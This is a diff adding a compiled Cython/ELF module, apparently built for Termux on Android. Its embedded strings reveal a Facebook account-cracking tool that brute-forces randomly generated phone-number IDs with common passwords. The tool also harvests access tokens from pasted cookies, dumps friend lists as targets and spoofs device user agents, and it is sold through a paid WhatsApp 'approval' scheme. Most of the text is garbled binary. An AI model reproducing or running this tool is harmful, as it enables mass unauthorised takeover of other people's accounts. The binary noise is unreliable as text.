@@ -1,0 +1,1369 @@
+ELF�@ @8
+@ @@@00�8�8�8�H�H�R�r�r��0X0�0���HTHtHt��R�td�R�r�r�`
+P�td$5$5$5||Q�tdppp���Androidr25b8937393Xi{�������!6MYlz������-Zk��������(7F`q��������1GUgt�������/Ј;��@ЈG
+�H;Јc
+F���F�qX��|BE��p�Q|FeKK-=2?#)19"4&.I+<FE,' B08C
+DJ6;G$H>A%	
+(*3/@7!5:__cxa_finalize__cxa_atexit__register_atfork__bss_start_end_edataPyInit_Premium64PyModuleDef_InitPyThreadState_GetPyInterpreterState_GetIDPyExc_ImportErrorPyErr_SetStringPyObject_GetAttrStringPyModule_NewObject_Py_DeallocPyModule_GetDictPyDict_SetItemString_Py_NoneStructPyExc_AttributeErrorPyErr_ExceptionMatchesPyErr_ClearPyExc_RuntimeErrorPy_GetVersionPyOS_snprintfPyErr_WarnExPyTuple_NewPyBytes_FromStringAndSizePyUnicode_FromStringAndSizePyImport_AddModulePyObject_SetAttrStringPyUnicode_InternFromStringPyUnicode_DecodePyObject_Hash__pyx_module_is_main_Premium64PyObject_SetAttrPyImport_GetModuleDictPyDict_GetItemStringPyTuple_PackPyList_NewPyDict_NewPyImport_ImportModuleLevelObjectPyErr_Fetch_PyObject_GetDictPtr_Py_FalseStruct_Py_TrueStructPyObject_NotPyErr_OccurredPyDict_SetItem_PyDict_GetItem_KnownHashPyObject_GetAttrPyErr_RestorePyUnicode_FromFormatPyUnicode_AsUTF8PyCode_NewEmptyPyFrame_NewPyTraceBack_HerePyMem_ReallocPyMem_Malloc__stack_chk_failPyExc_NameErrorPyErr_FormatPy_EnterRecursiveCallPy_LeaveRecursiveCallPyObject_CallPyExc_SystemErrorPyObject_DirPyDict_ContainsPyExc_TypeErrorPyEval_GetBuiltinsPyCode_TypePyUnicode_AsUTF8StringPyEval_MergeCompilerFlagsPyRun_StringFlagsPyEval_EvalCodelibc.soLIBC/data/data/com.termux/files/usr/lib:/data/data/com.termux/files/usr/lib:/data/data/com.termux/files/usr/lib:/data/data/com.termux/files/usr/liblibandroid-support.solibpython3.11.so.1.0�r�r�r���r��r���r�r��s s��(s�4Hsp�Ps�4psP�xs�4�sX��s5�sH��s5�s���s58t�H@t�HX��p�؈x�����I��0L�u�u�uvv'v( v7(v<0v?8vAvJXv`vhvpvxv�v�v�v	�v
+�v�v�v
+�v�v�v�v�v�v�v�v�vwwww w(w0w 8w!@w"Hw#Pw$Xw%`w&hw)pw*xw+�w,�w-�w.�w/�w0�w1�w2�w3�w4�w5�w6�w8�w9�w:�w;�w=x>x@xBxC xD(xEoriginexec: arg 1 must be string, bytes or code object, got %.200sModule 'Premium64' has already been imported. Re-initialisation is not supported.Premium64.pycompiletime version %s of module '%.100s' does not match runtime version %sbuiltins/sdcard/Premium64.cname__path__name '%U' is not definedloader%d.%d while calling a Python objectexec() arg 2 must be a dict, not %.200ssubmodule_search_locations__package__init Premium64__file__Interpreter change detected - this module can only be loaded into one interpreter per process.NULL result without error in PyObject_Call%s (%s:%d)parentcython_runtime__loader__Premium64code object passed to exec() may not contain free variables__builtins__cline_in_traceback��
+�dZ	ddlZddlZddlZddlZddlZddlZddlZddlZddl	Z	ddl
+Z
+ddl	TddlZddlm
+ZddlmZddlmZn6#e$r.ed��ejd��ejd��YnwxYwgZ	ejd	��j���ZeD]Ze�e���n#YnxYwgZ	ejd
+��j���ZeD]Ze�e���n#YnxYwejgd���Z gZ!e"d��D]�Zd
+Z#ejgd���Z$de%e ����Z&dZ'ej(dd��Z)dZ*ej(dd��Z+ej(dd��Z,dZ-e#�de$�de&�de'�e)�de*�de+�de,�de-��Z.e!�e.����e"d��D]�Z/dZ#ejgd���Z$dZ&ejgd���Z0ej(d d!��Z1ejgd���Z2d"Z'ej(dd��Z)dZ*ej(dd��Z+ej(dd��Z,d#Z-e#�de$�de&�e0�e1�e2�de'�e)�de*�de+�de,�de-��Z3e!�e3����gZ4e"d��D�]Z5ej6Z7ejgd���Z8ej(d d!��Z9d$e%e7d%d&�����d'e%e8���e%e9���e%e8���d(e%e7d)d*�����d+e%e7d,d-�����de%e7d.d)�����d/e%e7d)d0�����d+e%e7dd1�����de%e7dd1�����d2�Ze4�e����gZ:e"d��D]�Z;ej6Z7d3e%e7d4d5�����de%e7d4d5�����d6e%e7d d%�����d7e%e7d)d8�����d+e%e7d9d-�����de%e7d)d�����d:e%e7d)d8�����d+e%e7d9d-�����de%e7d)d������Ze:�e����d;�Z<d<Z=d=�Z>d>�Z?d?Z@d@ZAdAZBdBZCdCZDdDZEdEZFdFZGdGZHdHZIdEZJdI�ZKdaLgaMgaNgZOgZPgZQejRdJ��n#YnxYwdK�ZSdL�ZTdM�ZUdN�ZVdO�ZWdP�ZXdQ�ZYdR�ZZdS�Z[dT�Z\dU�Z]dV�Z^dW�Z_	e<��dS#ej`ja$redX��eb��YdSeb��YdSxYw)Y)zcom.facebook.adsmanagerzcom.facebook.litezcom.facebook.orcazcom.facebook.katana�N)�*)�ThreadPoolExecutor)�
+BeautifulSoupz 
+ Installing missing modules ...z/pip install requests bs4 futures==2 > /dev/null�python AKING.pyz@https://raw.githubusercontent.com/AKING110/Data/main/strings.txtzAhttps://raw.githubusercontent.com/AKING110/User-Agent/main/ua.txt(}zGT-1015zGT-1020zGT-1030zGT-1035zGT-1040zGT-1045zGT-1050zGT-1240zGT-1440zGT-1450zGT-18190zGT-18262z	GT-19060IzGT-19082zGT-19083zGT-19105zGT-19152zGT-19192zGT-19300zGT-19505zGT-2000zGT-20000zGT-200szGT-3000z	GT-414XOPzGT-6918zGT-7010zGT-7020zGT-7030zGT-7040zGT-7050zGT-7100zGT-7105zGT-7110zGT-7205zGT-7210zGT-7240RzGT-7245zGT-7303zGT-7310zGT-7320zGT-7325zGT-7326zGT-7340zGT-7405zGT-7550	5GT-8005zGT-8010zGT-81zGT-810zGT-8105zGT-8110zGT-8220SzGT-8410zGT-9300zGT-9320zGT-93GzGT-A7100zGT-A9500z
+GT-ANDROIDzGT-B2710zGT-B5330z	GT-B5330Bz	GT-B5330LzGT-B5330ZKAINUzGT-B5510zGT-B5512zGT-B5722zGT-B7510zGT-B7722zGT-B7810zGT-B9150zGT-B9388zGT-C3010zGT-C3262z	GT-C3310RzGT-C3312z	GT-C3312Rz	GT-C3313TzGT-C3322z	GT-C3322izGT-C3520z	GT-C3520IzGT-C3592zGT-C3595zGT-C3782zGT-C6712z	GT-E1282TzGT-E1500zGT-E2200zGT-E2202zGT-E2250zGT-E2252zGT-E2600z	GT-E2652WzGT-E3210zGT-E3309z	GT-E3309Iz	GT-E3309TzGT-G530HzGT-g900fzGT-G930FzGT-H9500zGT-I5508zGT-I5801zGT-I6410zGT-I8150zGT-I8160OKLTPAzGT-I8160ZWLTTTzGT-I8258z	GT-I8262DzGT-I8268zGT-I8505zGT-I8530BAABTUzGT-I8530BALCHOzGT-I8530BALTTTz	GT-I8550EzGT-i8700zGT-I8750zGT-I900z	GT-I9008LzGT-i9040z	GT-I9080Ez	GT-I9082CzGT-I9082EWAINUz	GT-I9082iz	GT-I9100GzGT-I9100LKLCHTz	GT-I9100Mz	GT-I9100Pz	GT-I9100TzGT-I9105UANDBTz	GT-I9128Ez	GT-I9128Iz	GT-I9128Vz	GT-I9158Pz	GT-I9158Vz	GT-I9168Iz	GT-I9192Iz	GT-I9195Hz	GT-I9195LzGT-I9250z	GT-I9303Iz	GT-I9305Nz	GT-I9308Iz	GT-I9505Gz	GT-I9505Xz	GT-I9507VzGT-I9600zGT-m190zGT-M5650zGT-miniz	GT-N5000SzGT-N5100zGT-N5105zGT-N5110zGT-N5120z	GT-N7000BzGT-N7005z	GT-N7100TzGT-N7102zGT-N7105z	GT-N7105TzGT-N7108z	GT-N7108DzGT-N8000zGT-N8005zGT-N8010zGT-N8020zGT-N9000zGT-N9505zGT-P1000CWAXSAz	GT-P1000Mz	GT-P1000TzGT-P1010z	GT-P3100BzGT-P3105zGT-P3108zGT-P3110zGT-P5100zGT-P5200zGT-P5210XD1zGT-P5220zGT-P6200z	GT-P6200LzGT-P6201zGT-P6210zGT-P6211zGT-P6800zGT-P7100zGT-P7300z	GT-P7300BzGT-P7310zGT-P7320z	GT-P7500Dz	GT-P7500Mz	GT-P7500Rz	GT-P7500VzGT-P7501zGT-P7511zGT-S3330zGT-S3332zGT-S3333zGT-S3370zGT-S3518zGT-S3570z	GT-S3600izGT-S3650z	GT-S3653Wz	GT-S3770Kz	GT-S3770Mz	GT-S3800WzGT-S3802zGT-S3850zGT-S5220z	GT-S5220RzGT-S5222zGT-S5230z	GT-S5230Wz	GT-S5233Tz	GT-s5233wzGT-S5250zGT-S5253zGT-s5260zGT-S5280zGT-S5282z	GT-S5283BzGT-S5292zGT-S5300z	GT-S5300LzGT-S5301z	GT-S5301Bz	GT-S5301LzGT-S5302z	GT-S5302BzGT-S5303z	GT-S5303BzGT-S5310z	GT-S5310Bz	GT-S5310Cz	GT-S5310Ez	GT-S5310Gz	GT-S5310Iz	GT-S5310Lz	GT-S5310Mz	GT-S5310NzGT-S5312z	GT-S5312Bz	GT-S5312Cz	GT-S5312LzGT-S5330zGT-S5360z	GT-S5360Bz	GT-S5360Lz	GT-S5360TzGT-S5363zGT-S5367zGT-S5369zGT-S5380z	GT-S5380DzGT-S5500zGT-S5560z	GT-S5560iz	GT-S5570Bz	GT-S5570Iz	GT-S5570LzGT-S5578zGT-S5600zGT-S5603zGT-S5610z	GT-S5610KzGT-S5611zGT-S5620zGT-S5670z	GT-S5670BzGT-S5670HKBZTAzGT-S5690z	GT-S5690RzGT-S5830z	GT-S5830Dz	GT-S5830Gz	GT-S5830iz	GT-S5830Lz	GT-S5830Mz	GT-S5830Tz	GT-S5830Vz	GT-S5831izGT-S5838z	GT-S5839izGT-S6010zGT-S6010BBABTUzGT-S6012z	GT-S6012BzGT-S6102z	GT-S6102Bz	GT-S6293Tz	GT-S6310BzGT-S6310ZWAMIDzGT-S6312z	GT-S6313TzGT-S6352zGT-S6500z	GT-S6500Dz	GT-S6500LzGT-S6790z	GT-S6790Lz	GT-S6790Nz	GT-S6792LzGT-S6800zGT-S6800HKAXFAzGT-S6802zGT-S6810z	GT-S6810Bz	GT-S6810Ez	GT-S6810Lz	GT-S6810MzGT-S6810MBASERz	GT-S6810PzGT-S6812z	GT-S6812Bz	GT-S6812Cz	GT-S6812izGT-S6818z	GT-S6818Vz	GT-S7230Ez	GT-S7233Ez	GT-S7250DzGT-S7262zGT-S7270z	GT-S7270LzGT-S7272z	GT-S7272Cz	GT-S7273TzGT-S7278z	GT-S7278UzGT-S7390z	GT-S7390Gz	GT-S7390LzGT-S7392z	GT-S7392LzGT-S7500zGT-S7500ABABTUzGT-S7500ABADBTzGT-S7500ABTTLPzGT-S7500CWADBTz	GT-S7500Lz	GT-S7500TzGT-S7560z	GT-S7560MzGT-S7562z	GT-S7562Cz	GT-S7562iz	GT-S7562LzGT-S7566zGT-S7568z	GT-S7568IzGT-S7572z	GT-S7580Ez	GT-S7583TzGT-S758XzGT-S7592zGT-S7710z	GT-S7710LzGT-S7898z	GT-S7898IzGT-S8500zGT-S8530zGT-S8600z	GT-STB919zGT-T140zGT-T150zGT-V8azGT-V8izGT-VC818z	GT-VM919SzGT-W131zGT-W153zGT-X831zGT-X853zGT-X870zGT-X890zGT-Y8750i'zMozilla/5.0 (Linux; U; Android)�6�7�8�9�10�11�12�13z en-us; z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/�I�d�0ihi$�(�zMobile Safari/537.36� z; z) �.z"Mozilla/5.0 (Linux; Android 6.0.1;z7en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V))�A�B�C�D�E�F�G�H�I�J�K�L�M�N�O�P�Q�R�S�T�U�V�W�X�Y�Z�i�z:AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99zMobile Safari/533.1zMozilla/5.0 (Windows NT 10.0; �	�z
+; Win64; x64)z() AppleWebKit/537.36 (KHTML, like Gecko)�c�z.0.i�i��#z Chrome/��z Safari/537.36z%Mozilla/5.0 (Macintosh; Intel Mac OS ���_z0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/��i�z Safari/537.36 OPR/c���tjd��tt��t	tj����t	tj����z}d�|��}	tj	d��j
+}||vrStd��t	tj����}tjd��t��dStd|z��td��td��td��td	��td
+��td��td��td��td
+��d|z}tjd|z��t��ftjd��t��dS#t!j��YdSxYw)N�clear�-zChttps://raw.githubusercontent.com/DaniMalik1/Approval.txt/main/Approval12345.txtz#Your Token is Successfully Approvedg�?z
+Your Token : �5[1;37m----------------------------------------------z[1;32mImportant Notez6[1;37mFor 15 Days Approval Price 400  One Month Pricez/600 Easypaisa Ya Kaise Be Acc sy payment kar kaz1Pay ki ss admin ko sent kara free wala door rahooz*IF U DONT WANT TO BUY PLS DONT PRESS ENTERz"IF U WANT TO BUY THEN PRESS ENTER zIHello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20z*am start https://wa.me/+923188508994?text=r0)�os�system�print�logo�str�geteuid�getlogin�join�requests�get�text�time�sleep�menu�input�approval�sys�exit)�uuid�id�httpCaht�msg�tkss     rrOrOJs����)�G������+�+�+�	�R�Z�\�\�	�	�S�����/�/�	/�$�
+�x�x��~�~�"���|�a�b�b�g�H�	�X�~���1�2�2�2���
+�����c�
+�j��o�o�o�
+�f�f�f�
+�d��O�B������E�F�F�F��%�&�&�&��E�F�F�F��F�G�G�G��=�>�>�>��?�@�@�@��E�F�F�F��
+9�:�:�:��0�1�1�1�
+X�Y[�
+[�c�]_�]f�hT�UX�hX�^Y�^Y�Zb�Zd�Zd�^d�^d�
+�j��m�m�m��j�j�j�j�j����H�J�J�J�J�J�J���s�A.G�0C%G�G/a�[1;37m        [1;32m######  ##     ## ######## [1;37m 
+       [1;37m##    ##  ##   ##  ##     ## [1;37m
+       [1;37m##         ## ##   ##     ## 
+        [1;32m######     ###    ########[1;37m
+             ##   ## ##   ##     ## 
+       ##    ##  ##   ##  ##     ## 
+       [1;32m ######  ##     ## ########  [1;37m
+ 
+[1;37m----------------------------------------------
+[+] Author  : Junaid Khan
+[+] Github  : power-890
+[+] Version : [1;31m1.0
+[1;37m----------------------------------------------c�$�td��dS)Nr?)rB��r�linexrZ�s���A�B�B�B�B�BrYc�V�tjd��tt��dS)Nr=)r@rArBrCrXrYrr=r=�s!����7�����t�����rY�[1;97mz[1;96mz[1;91mz[1;92mz[1;31mz[1;32m�[1;37mz[1;93mz[1;94mz[1;95mc
+��|�dd|i���j}t|d��}|jdd���}d�|�d	��D��}t|��d
+kr1t
+dtttttfz��n|t
+dt�d
+�tz��tt|����D]?}t
+dt|dz||�dd��tfz���@|�dd|i���j}t|d��}|jdd���}d�|�d	��D��}t|��d
+kr2t
+dtttttfz��dSt
+dt�d�tz��tt|����D]?}t
+dt|dz||�dd��tfz���@dS)Nz<https://mbasic.facebook.com/settings/apps/tabbed/?tab=active�cookie��cookieszhtml.parser�form�post)�methodc��g|]	}|j��
+SrX�rJ��.0�is  r�
+<listcomp>zcek_apk.<locals>.<listcomp>����*�*�*�A���*�*�*rY�h3ru0
+%s [%s•%s] %sActive Apks & Web Not Found %s		�
+u  [•]%s Active Apks & Web 👇 z
+%s [%s] %s %s r0zDitambahkan padaz Ditambahkan padaz>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactivec��g|]	}|j��
+SrXrfrgs  rrjzcek_apk.<locals>.<listcomp>�rkrYu1
+%s [%s•%s] %sExpired Apks & Web Not Found %s		u! [•]%s Expired Apks & Web 👇 �Kedaluwarsaz Kedaluwarsa)rIrJr�find�find_all�lenrBr#rr�ranger�replacer"r)�session�coki�w�sop�x�gameris       r�cek_apkr{�s-��
+�;�;�M�W_�`d�Ve�;�f�f�k���Q�}�%�%��
+�S�X�f�F�#�#�#��*�*����D�)�)�*�*�*����I�I�q�L�`��<�a��!�A�a�[�H�I�I�I�I��0�Q�0�0�0�!�4�5�5�5���T�����`�`�a��	�a��!��D��G�O�O�4F�GZ�$[�$[�\]�^�	^�_�_�_�_�
+�;�;�O�Ya�bf�Xg�;�h�h�m���Q�}�%�%��
+�S�X�f�F�#�#�#��*�*����D�)�)�*�*�*����I�I�q�L�V��=�q��1�Q�q�k�I�J�J�J�J�J��1�Q�1�1�1�1�5�6�6�6���T�����V�V�a��	�a��!��D��G�O�O�M�.�$Q�$Q�RS�T�	T�U�U�U�U�V�VrY�datac�`�t��td��t��td��}|dvrt	��dS|dvr[t��td��tjd��d}tjd|�d	���t��dSdS)
+Nz= [1] Login with cookies 
+ [2] Get free cookies
+ [0] Back menu�	 Choose: ��1�01��2�02u4  Follow over facebook page for more activities ❤ r0�100084680097792z"xdg-open https://www.facebook.com/zX/posts/pfbid02RxpxwxmkuN8NmoYpP7du8tomrUWXjLsK6FJtCnveNwPHxxg53udvZZUiu24hudDPl/?app=fbl)
+r=rBrZrN�loginrKrLr@rA�c_login)�xx�isds  rr�r��s��������H�I�I�I�����	�+�����*����'�'�'�'�'��J����'�'�'��>�?�?�?��
+�1�
+�
+�
+�	�#��)�
+O��
+O�
+O�
+O�P�P�P�	�)�)�)�)�)��rYc
+�@�t��td��}	tjdddddddd	d
+dd�	d
+|i���}t	jd|j��}tdd���|�	d����tdd���|��tdd���
+��}td��tj
+d��t��dS#t$rt!d��YdStjj$r't!d��t'jd��YdSt*$r5td��t'jd��t-��YdSwxYw)Nz Put cookies: z0https://business.facebook.com/business_locationsz�Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36zhttps://www.facebook.com/zbusiness.facebook.comzhttps://business.facebook.comr�z#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�	max-age=0z�text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8ztext/html; charset=utf-8)	�
+user-agent�referer�host�origin�upgrade-insecure-requests�accept-language�
+cache-control�accept�content-typer_)�headersraz(EAB\w+)�
+data/tokenrwr0�	data/coki�rz& Cookies login has been successfull...z#[1;31m Cookies has been expired...z internet connection error...)r=rNrHrI�re�searchrJ�open�write�group�readrBrKrLrM�KeyErrorrQ�
+exceptions�ConnectionErrorr@rA�AttributeErrorr�)rar|�
+find_token�toks    rr�r��s��������!�"�"���	��H�do�{V�_v�A`�B�V{�MX�bP
+�`
+z
+�U{
+�U{
+�HP�QX�GY�
+Z�
+Z�
+Z�$��y��T�Y�/�/�*��|�S�����
+� 0� 0�� 3� 3�4�4�4��{�3�����g�&�&�&�
+�<����!�!�#�#�#��0�1�1�1��*�Q�-�-�-��&�&�&�&�&���1�1�1��/�0�0�0�0�0�0���+�����&�'�'�'��)�L������������0�1�1�1��)�L����	�)�)�)�)�)�)����s�C)D
+�
+F�&6F�:F�Fc���t��	tdd�����}tdd�����}tjd|zd|i���}tj|j��}	|d}n#|d}YnxYwn8#td	��tj
+d
+��t��YnxYwtd|�d���dS)
+Nz
+cokie/cokir�z
+coki/tokenz,https://graph.facebook.com/me/?access_token=rar`�name�userz[1;31m Cookies has expired r0z Welcome : [1;32m� [1;37m)r=r�r�rHrI�json�loadsrJrBrKrLr�)rv�token�otw�a�namas     r�creater��s�������
+��L����"�"�$�$�$��\�#���#�#�%�%�%���C�E�I�V_�`d�Ue�f�f�f�#�
+�j�����!��
+�F�)�4�4���
+�F�)�4�4�4������
+��	*�+�+�+��:�a�=�=�=�
+�9�9�9�9�9�����0�t�0�0�0�1�1�1��s$�A8B"�	B�B"�
+B�B"�"3Cc�*�g}	tdd�����}tdd�����}t�|��nA#t$r4td��t
+jd��t��YnwxYwt��t
+jd��t��	ttd����}n#t$rtd��YnwxYw|dks|dkrt��tj��}d	}t#|��D]2}|dz
+}td
+|d	z�d���}|�|���3t%��td��t%��td
+��t%��td��}t%��td��t%��td��}	|	dvrt&�d��nt&�d��t%��td��t%��|D]�}
+	|�d|
+zdztd	zd|i������}|ddD]B}	|ddz|dz}
+|
+t,vrnt,�|
+���<#Y�@xYw��#t.tf$rY��tjj$rtd��Y��wxYw	g}	ttd����}n	#d}YnxYwt%��td��t%��t#t4��D]+}|�td|dz�d������,t7d �!��5}t��t9t;t,����}td"|zd#|��z��td$��t%��t,D]}}|�d��\}}|}|d%vr|�t@|||���>|d&vr|�tB|||���`|�tD|||���~	ddd��n#1swxYwYtd'��t%��td(��td)t9t;tF����zd*zt9t;tH����z��t%��td+��tKj&d,��dS#tjj$rtd��YdSt.tf$r8td-|
+����t
+jd.��tO��YdSwxYw)/Nr�r�r�z"[1;31mYour cookies han expired...r0z0 [1;36mHow many ids you went to clone ?[1;37m z Put only digits not latters �rz[1;37m Put link no.�: � All method working try 1 by 1 z1 [1] Method 1 (best) 
+ [2] Method 2
+ [3] Method 3z Choose method: z% Do you went show cp account? (y/n): r~)�yr#�yes�nor�r�z%[1;32m Dumping friend list...[1;37mz https://graph.facebook.com/v2.0/z)?fields=friends.limit(5000)&access_token=rar`�friendsrS�|�uidz No internet connectionz) How many passwords do you want to add ? �*[1;32m exp: first last,firtslast,first123z Put password ���max_workers� Total account : [1;32m�+ [1;33m>[1;36m> [1;37mMethod -> [1;37mM�6[1;37m [38;5;208mUse flight mode for speed up[1;37mrr�r]� The process has completed� Total OK/CP: �/� Press enter to back rz No friends for �)(r�r��tokenku�append�IOErrorrBrKrLr�r�r=�intrN�
+ValueErrorrQrH�SessionrsrZ�pcprIr�rSr�r�r��limit�tredrDrr�split�submit�api�ffb�mmm�oks�cpsr@rA�public)�usrrr��cok�jum�ses�yz�met�kl�mthd�cx�userr�col�mi�iso�plist�ps_limitri�crack_submit�	total_idsr��ids�names�passlists                       rr�r��ss������\�#���#�#�%�%�#��[����"�"�$�$�#�	�.�.������������/�0�0�0���A����	�)�)�)�)�)�����������A��������(�	�%�H�
+I�
+I�J�J�#�#���(�(�(��&�'�'�'�'�'�(������E�	�S��X�	��&�&�&�
+��������#�J�J���S��a�%�"��
+/�r�!�t�
+/�
+/�
+/�0�0�"��+�+�b�/�/�/�/������(�)�)�)������<�=�=�=�����
+� �!�!�������.�/�/�/�����	�+�����
+"�"���*�*�S�/�/�/�/��*�*�S�/�/�/������4�5�5�5������$�$�U�$�	���3�E�9�:e�e�fm�no�fp�p�~G�HK�}L��
+M�
+M�
+R�
+R�
+T�
+T�3�
+��^�I�
+&���r���t�H�S�L��E��"�S��r�	��$�
+�)�)�C�.�.�.����8�8�������7�	�����4�	�	�	,�$�$�$��"�#�#�#�#�#�$����&�
+�%���%�C�D�D�E�E�8�8���
+�8�8�8�����'�'�'��7�8�8�8��'�'�'���<�<�1�1�a��<�<��.�q��s�.�.�.�/�/�0�0�0�0������1�|��7�7�7��3�r�7�7�|�|�9��	&�y�	0�1q�ko�1q�1q�	q�r�r�r��	J�K�K�K��7�7�7��1�1�t��
+�
+�3���I�C���H��z��1�����S��x�0�0�0�0�	
+��	�1�����S��x�0�0�0�0�����S��x�0�0�0�0�1�
+1�1�1�1�1�1�1�1�1�1�1����1�1�1�1�������'�'�'��$�%�%�%����S��X�X���&�s�*�3�s�3�x�x�=�=�8�9�9�9��'�'�'��� � � ��)����������+�#�#�#��!�"�"�"�"�"�"�	�'������"�5�"�"�#�#�#��*�Q�-�-�-��(�(�(�(�(�(����s��AA#�#;B!� B!�C2�2D�
+D�<AL
+�8L�L
+�L	�L
+�
+M� "M�M�	V$�M)�(V$�)M/�-BV$�-C*S$�V$�$S(�(V$�+S(�,B6V$�$#X�
+AX�Xc�6�t��d}td|z��td��t��td��t��td��}|dv�r�t��td��t��td��}	t	|d	��������}nA#t$r4td
+��tj	d��t��YnwxYwt��td��t��td
+��t��td��}t��g}	ttd����}n	#d}YnxYwt��td��t��t|��D]+}|�
+td|dz�d������,t��td��t��td��}|dvrt�
+d��nt�
+d��td���5}	t��t!t#|����}
+td|
+zd|��z��td��t��|D]}}|�d��\}}
+|}|dvr|	�t(||
+|���>|dvr|	�t*||
+|���`|	�t,||
+|���~	ddd��n#1swxYwYtd��t��td��td t!t#t.����zd!zt!t#t0����z��t��td"��t3jd#��dS|dvrtd$��t7��dS|d%vrit9��t:dvrt=��dSt:dvrt?��dSt:d%vrtA��dSt��dS|d&vrtA��dS|d'vr)d(}t3jd)|����t��dS|d*vr$t3jd+��t��dS|d,vr$t3jd-��t��dS|d.vrt7d/��dSt7d0��tC��fdS)1Nz[1;32m Premium[1;37mz
+ Status : z This tools for mix ids cloningzK[1] File cloning
+[3] Public cloning
+[4] WhatsApp Group (join)
+[0] Exit menuz[+]Choose an option: rz.[+] Put file example:  /sdcard/File.txt  etc..z"[+] Put file path[1;37m: /sdcard/r�z File location not found r0r�z0[1] Method 1 (working)
+[2] Method 2
+[3] Method 3z[+] Choose: u.[✓] How many passwords do you want to add ? r�u[✓] Put password r�u*[✓] Do you went show cp account? (y/n): )r�r#r��Nor�r�r#r�r�r�r�r�r�r�r]r�r�r�r��
+python Run.pyz
+ Next update ��3�03)�5�05)�4�04z/Ke0CvaIL39C3cj0arbLVwOz#xdg-open https://chat.whatsapp.com/)r�07zAxdg-open mediafire.com/file/y1wvgc2zqqunxbn/AKING_VPN1.0.apk/file)r	�08z�xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl)r�00u Thanks for use 🥰 z Option not found in menu...)"r=rBrZrNr�r��
+splitlines�FileNotFoundErrorrKrLrMr�rsr�r�r�rDrrr�r�r�r�r�r�r�r@rArQr�ry�pak�bd�gmail�main)�status�xd�file�for�r�r�rir�r�r�r�r�r�r��wxs                rrMrM>s����7�7�7�)�6���f�	�����	*�+�+�+��7�7�7��	Y�Z�Z�Z��7�7�7��#�$�$�2��J��Y0�	�G�G�G�	�
+:�;�;�;�	�G�G�G��8�9�9�D��
+�t�C�.�.�
+�
+�
+�
+�
+*�
+*�
+,�
+,�R�R������
+�&�'�'�'�	�Z��]�]�]�	�V�V�V�V�V�����
+�G�G�G�	�
++�,�,�,�	�G�G�G�	�
+>�?�?�?�	�G�G�G�	�~�	�	�D�	�G�G�G��E���E�J�K�K�L�L�X�X����X�X�X����	�G�G�G�	�
+9�:�:�:�	�G�G�G�
+�8�_�_�8�8��
+�\�\�%�5�a��c�5�5�5�6�6�7�7�7�7�	�G�G�G�	�
+6�7�7�7�	�G�G�G��^���B�	�
+%�%���Z�Z��_�_�_�_��Z�Z��_�_�_�	
+�"�	�	�	�3��
+�W�W�W��S��W�W���Y�
+�(��2�3s�mq�3s�3s�s�t�t�t�
+�L�M�M�M�
+�W�W�W��3�3���*�*�S�/�/�i�c�%��h�	
+��	�3����3�s�5��2�2�2�2��:��3����3�s�5��2�2�2�2����3�s�5��2�2�2�2�3�
+3�3�3�3�3�3�3�3�3�3�3����3�3�3�3�
+�,����	�G�G�G�	�
+&�'�'�'�	�
+�3�s�3�x�x�=�=�
+(��
+,�S��S���]�]�
+:�;�;�;�	�G�G�G�	�
+!�"�"�"��I�o������
+�j��0�
+�/����4�6�6�6�6�6�
+�j��0�
+�H�H�H�	�J����U�U�U�U�U�	
+�j����T�T�T�T�T�	
+�j���
+�W�W�W�W�W�	�V�V�V�V�V�
+�j��0�	�G�G�G�G�G�
+�j��
+0�!�B��I�8�B�8�8�9�9�9�$�&�&�&�&�&�
+�j��0��I�Q�R�R�R�SW�SY�SY�SY�SY�SY�
+�j��0��I�Y�Z�Z�Z�[_�[a�[a�[a�[a�[a�
+�j��0��	 �!�!�!�!�!��	'�(�(����/�/�/�/s1�,4C!�!;D�D�
+F'�'F-�C N�N
+�
+N
+c��g}t��td��td��}	ttd����}n#t$rd}YnwxYwt��td��t��td��}t��td��t��td��}t
+|��D]C}d	�d
+�t
+d��D����}|�|���Dtd�
+��5}t��tt|����}td|zd|��z��td|z��td��t��|D]c}	||	z}
+|dvr|
+g}n|dvr|
+ddddg}n|
+ddddddddg	}|dvr|�t|
+|���G|�t|
+|���d	ddd��n#1swxYwYtd��t��td��tdttt����zdzttt ����z��t��td ��t#jd!��dS)"Nz)[1;31m Code example: 0306,0315,0335,0345�[1;37m put code: �<[1;31m example: 2000, 3000, 5000, 10000
+[1;37m put limit: r�� [1] Method 1
+ [2] Method 2 r~zs [1] Clone with 7+11 digit pass (v-fast)
+ [2] Clone with auto pass (fast)
+ [3] Clone with auto pass v2 (slow-best) z
+ [?] Select: �c3�RK�|]"}tjtj��V��#dS�N��random�choice�string�digits�rhr:s  r�	<genexpr>zpak.<locals>.<genexpr>��.����@�@�!���v�}�-�-�@�@�@�@�@�@rYr8r�r�r�r��[1;37m Choice code ..:[1;32m �6[1;37m [38;5;208mUse flight mode for speed up[1;97mrr��khankhan�khan1122�Ali786�khan1234�Ali123�ali786�khan123�	khan12345r]r�r�r�r�r��r=rBrNr�r�rZrsrGr�r�rDrrr��rcrack1�rcrackr�r�r@rA)r��coder�r��pcs�nmbr�nmp�Aking�tl�psxr�r�s            rr�r��s(��	�$��'�'�'��6�7�7�7�	�&�	'�	'�$���u�Z�[�[�\�\�5�5��	�����5�5�5������'�'�'��'�(�(�(��'�'�'�	�{�	�	�$��'�'�'���A�A�A��'�'�'�
+�o���#��E�l�l���d�	���@�@�u�Q�x�x�@�@�@�	@�	@�3��;�;�s����������'�u��7�7�7��C��I�I���2��	&�r�	)�*j�dh�*j�*j�	j�k�k�k��	1�$�	6�7�7�7��	K�L�L�L��7�7�7��'�'�s�
+�s�(�C�
+�j��h���X�X�	�
+�	�h��Z�
+�8�J�?�X�X��Z�
